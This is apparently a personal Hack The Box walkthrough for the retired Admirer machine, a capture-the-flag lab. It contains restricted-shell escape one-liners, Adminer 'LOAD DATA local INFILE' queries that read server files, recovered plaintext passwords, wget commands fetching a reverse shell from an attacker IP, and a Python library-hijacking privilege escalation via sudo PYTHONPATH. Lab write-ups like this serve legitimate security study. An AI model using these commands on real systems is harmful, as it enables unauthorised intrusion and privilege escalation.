---
tags:
  - Linux
  - HTB
  - Retired
creation date: 2024-08-17
Date Completed: 2024-08-24
CVEs: CVE-2021-43008
URL: https://app.hackthebox.com/machines/Admirer
New Tools: AdminerRead
---
## Information Gathering
### Nmap (Ports/Services)
```
sudo nmap -sT -sV -sC -O -p- -T4 --min-rate=1000 $IP  
```

```
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
| http-robots.txt: 1 disallowed entry 
|_/admin-dir
|_http-title: Admirer

```

### ffuf (Directories/Subdomain/Files)

![[Pasted image 20240824085435.png]]


![[Pasted image 20240824090945.png]]

![[Pasted image 20240824090914.png]]


![[Pasted image 20240824090856.png]]

### Restricted Shell Outbreak
1)From ssh > ssh username@IP - t "/bin/sh" or "/bin/bash"
2)From ssh2 > ssh username@IP -t "bash --noprofile"
3)From ssh3 > ssh username@IP -t "() { :; }; /bin/bash" (shellshock)
4)From ssh4 > ssh -o ProxyCommand="sh -c /tmp/yourfile.sh"
127.0.0.1 (SUID)
5)From git > git help status > you can run it then !/bin/bash
6)From pico > pico -s "/bin/bash" then you can write /bin/bash and
then CTRL + T
7)From zip > zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c
/bin/bash"
8)From tar > tar cf /dev/null testfile --checkpoint=1 --checkpoint-
action=exec=/bin/bash


![[Pasted image 20240824093335.png]]
![[Pasted image 20240824093351.png]]
ftpuser:%n?4Wz}R$tTF7

**Note:** Never stop Fuzzing

![[Pasted image 20240824111105.png]]
```sql
LOAD DATA local INFILE 'adminer.php' INTO TABLE loot fields TERMINATED BY "\n";
```

```sql
SELECT * FROM loot
```

```sql
LOAD DATA local INFILE '../../../../../../../etc/hosts' INTO TABLE loot fields TERMINATED BY "\n";
```

```sql
LOAD DATA local INFILE '/var/www/html/index.php' INTO TABLE loot fields TERMINATED BY "\n";
```

![[Pasted image 20240824112734.png]]


![[Pasted image 20240824112715.png]]
&<h5b~yK3F#{PaPB&dA}{H>

```
sudo PYTHONPATH=/tmp/ /opt/scripts/admin_tasks.sh
```

```
wget http://10.10.15.64:8000/revshell.py
```

```
wget http://10.10.15.64:8000/random.py
```

/opt/scripts/backup.py
```
#!/usr/bin/python3
# /opt/scripts/backup.py
from shutil import make_archive

src = '/var/www/html/'

# old ftp directory, not used anymore
#dst = '/srv/ftp/html'

dst = '/var/backups/html'

make_archive(dst, 'gztar', src)
```

create a malicious payload named shutil.py
then run with a listener:
```
sudo PYTHONPATH=/tmp/ /opt/scripts/admin_tasks.sh
```

reference: https://medium.com/analytics-vidhya/how-to-create-a-python-library-7d5aea80cc3f
https://rastating.github.io/privilege-escalation-via-python-library-hijacking/
https://book.hacktricks.xyz/linux-hardening/privilege-escalation#setenv